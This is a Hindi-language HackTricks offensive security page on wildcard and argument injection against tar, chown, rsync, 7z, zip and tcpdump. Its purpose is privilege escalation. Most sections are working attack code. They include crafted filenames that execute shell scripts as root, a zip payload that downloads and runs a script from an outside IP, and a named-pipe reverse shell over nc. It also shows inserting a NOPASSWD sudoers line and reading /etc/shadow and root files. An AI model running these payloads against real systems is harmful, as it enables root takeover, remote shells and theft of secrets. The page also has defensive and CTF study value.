# Wildcards अतिरिक्त तरकीबें

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** तब होता है जब कोई privileged script कोई Unix binary जैसे `tar`, `chown`, `rsync`, `zip`, `7z`, … बिना quoted wildcard जैसे `*` के साथ चलाता है।
> चूँकि shell wildcard को binary को execute करने से **पहले** expand कर देता है, एक attacker जो working directory में फाइलें बना सकता है वह ऐसे filenames बना सकता है जो `-` से शुरू होते हैं, ताकि उन्हें **options के रूप में data की बजाय** interpret किया जाए — इससे arbitrary flags या यहाँ तक कि commands भी smuggle किए जा सकते हैं।
> यह पेज 2023-2025 के लिए सबसे उपयोगी primitives, हालिया शोध और आधुनिक detections को एकत्रित करता है।

## chown / chmod

आप किसी भी फ़ाइल के owner/group या permission bits को `--reference` flag का दुरुपयोग करके **कॉपी** कर सकते हैं:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
जब root बाद में कुछ इस तरह निष्पादित करता है:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` इंजेक्ट किया गया है, जिससे *सभी* मेल खाने वाली फ़ाइलें `/root/secret``file` के स्वामित्व/अनुमतियाँ विरासत में पा लेती हैं।

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (संयुक्त हमला).
See also the classic DefenseCode paper for details.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** फीचर का दुरुपयोग करके किसी भी कमांड को निष्पादित किया जा सकता है:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
जब root उदाहरण के लिए `tar -czf /root/backup.tgz *` चलाता है, तो `shell.sh` root के रूप में निष्पादित होता है।

### bsdtar / macOS 14+

डिफ़ॉल्ट `tar` हाल के macOS पर (जो `libarchive` पर आधारित है) `--checkpoint` को लागू *नहीं* करता, लेकिन आप अभी भी **--use-compress-program** फ्लैग के साथ code-execution प्राप्त कर सकते हैं, जो आपको बाहरी कम्प्रेसर निर्दिष्ट करने की अनुमति देता है।
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
जब कोई privileged script `tar -cf backup.tar *` चलाती है, तो `/bin/sh` शुरू हो जाएगा।

---

## rsync

`rsync` आपको रिमोट शेल या यहाँ तक कि रिमोट बाइनरी को ओवरराइड करने देता है, कमांड-लाइन फ्लैग्स के माध्यम से जो `-e` या `--rsync-path` से शुरू होते हैं:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
If root later archives the directory with `rsync -az * backup:/srv/`, the injected flag spawns your shell on the remote side.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

यहाँ तक कि जब privileged स्क्रिप्ट *रक्षात्मक रूप से* वाइल्डकार्ड को `--` से प्रीफिक्स करती है (option parsing को रोकने के लिए), तब भी 7-Zip format फाइलनेम के आगे `@` लगाकर **file list files** को सपोर्ट करता है। इसे symlink के साथ combine करने से आप *exfiltrate arbitrary files* कर सकते हैं:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
यदि root कुछ इस तरह execute करता है:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip `root.txt` (→ `/etc/shadow`) को एक file list की तरह पढ़ने की कोशिश करेगा और बाहर निकल जाएगा, **सामग्री को stderr पर प्रिंट कर देगा**।

---

## zip

जब कोई एप्लिकेशन उपयोगकर्ता-नियंत्रित फाइलनाम `zip` को पास करता है (या तो wildcard के जरिए या बिना `--` के नामों को सूचीबद्ध करके), तो दो बहुत ही उपयोगी तरीके मौजूद होते हैं।

- RCE via test hook: `-T` “test archive” सक्षम करता है और `-TT <cmd>` tester को किसी भी प्रोग्राम से बदल देता है (लॉन्ग फॉर्म: `--unzip-command <cmd>`). अगर आप ऐसे फाइलनाम इंजेक्ट कर सकते हैं जो `-` से शुरू होते हैं, तो शॉर्ट-ऑप्शन्स parsing काम करने के लिए फ्लैग्स को अलग-अलग filenames में बाँट दें:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
नोट्स
- एक ही फाइलनाम जैसे `'-T -TT <cmd>'` आज़माने की कोशिश न करें — short options हर character के रूप में पार्स होते हैं और यह विफल होगा। जैसा दिखाया गया है, अलग-अलग tokens का उपयोग करें।
- यदि app द्वारा फाइलनामों से slashes हटाए जा रहे हैं, तो किसी bare host/IP से (default path `/index.html`) फाइल प्राप्त करें और स्थानीय रूप से `-O` के साथ सेव करें, फिर उसे चलाएँ।
- आप parsing को `-sc` (show processed argv) या `-h2` (more help) के साथ debug कर सकते हैं ताकि आप समझ सकें कि आपके tokens कैसे consumed हो रहे हैं।

उदाहरण (zip 3.0 पर स्थानीय व्यवहार):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: अगर वेब लेयर `zip` के stdout/stderr को echo करती है (आमतौर पर naive wrappers में), तो injected flags जैसे `--help` या गलत options की वजह से होने वाली failures HTTP response में दिखेंगी, जिससे command-line injection कन्फर्म होगा और payload tuning में मदद मिलेगी।

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

जब एक restricted shell या vendor wrapper उपयोगकर्ता-नियंत्रित फ़ील्ड्स (जैसे "file name" parameter) को जोड़कर `tcpdump` का command line बनाता है बिना कड़ाई से quoting/validation के, तो आप अतिरिक्त `tcpdump` flags छिपा सकते हैं। `-G` (time-based rotation), `-W` (limit number of files), और `-z <cmd>` (post-rotate command) का संयोजन tcpdump चलाने वाले user (अक्सर appliances पर root) के रूप में arbitrary command execution दे देता है।

Preconditions:

- आप `argv` को प्रभावित कर सकते हैं जो `tcpdump` को पास किया जाता है (उदा., एक wrapper के माध्यम से जैसे `/debug/tcpdump --filter=... --file-name=<HERE>`).
- wrapper file name फ़ील्ड में spaces या `-`-prefixed टोकन्स को sanitize नहीं करता।

Classic PoC (executes a reverse shell script from a writable path):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
विवरण:

- `-G 1 -W 1` पहले मिलान करने वाले पैकेट के बाद तुरंत रोटेट कर देता है।
- `-z <cmd>` हर रोटेशन पर post-rotate कमांड को एक बार चलाता है। कई बिल्ड `<cmd> <savefile>` को execute करते हैं। अगर `<cmd>` कोई script/interpreter है, तो सुनिश्चित करें कि आर्ग्युमेंट हैंडलिंग आपके payload से मेल खाती है।

नो-रिमूवेबल-मीडिया वेरिएंट:

- यदि आपके पास फाइल लिखने के लिए कोई अन्य primitive है (जैसे, आउटपुट रीडायरेक्शन की अनुमति देने वाला अलग command wrapper), तो अपनी स्क्रिप्ट को किसी ज्ञात path में रखें और प्लेटफ़ॉर्म semantics के अनुसार `-z /bin/sh /path/script.sh` या `-z /path/script.sh` ट्रिगर करें।
- कुछ vendor wrappers रोटेट करके attacker-controllable लोकेशन्स पर रखते हैं। यदि आप रोटेट किए गए path को प्रभावित कर सकते हैं (symlink/directory traversal), तो आप `-z` को इस तरह निर्देशित कर सकते हैं कि वह बिना external media के ऐसा कंटेंट execute करे जिसे आप पूरी तरह नियंत्रित करते हैं।

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

बहुत आम sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
समस्याएँ
- `*` glob और permissive पैटर्न केवल पहले `-w` argument को ही सीमित करते हैं। `tcpdump` कई `-w` options स्वीकार करता है; आखिरी वाला जीतता है।
- नियम अन्य options को pin नहीं करता, इसलिए `-Z`, `-r`, `-V`, आदि की अनुमति है।

प्राथमिक विधियाँ
- दूसरे `-w` के साथ गंतव्य पथ अधिलेखित करें (पहला केवल sudoers को संतुष्ट करता है):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal पहले `-w` के अंदर constrained tree से बाहर निकलने के लिए:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- आउटपुट का स्वामित्व जबरदस्ती सेट करने के लिए `-Z root` (कहीं भी root-owned फ़ाइलें बनाता है):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- बनायी हुई PCAP को `-r` के माध्यम से replay करके मनमाना-कंटेंट लिखना (उदा., sudoers लाइन डालने के लिए):

<details>
<summary>एक PCAP बनाएं जो बिल्कुल वही ASCII payload समाहित करे और उसे root के रूप में लिखें</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- मनमाना फ़ाइल पढ़ना/secret leak `-V <file>` के साथ (savefiles की सूची को interpret करता है). Error diagnostics अक्सर लाइनों को echo करते हैं, leaking content:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## संदर्भ

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
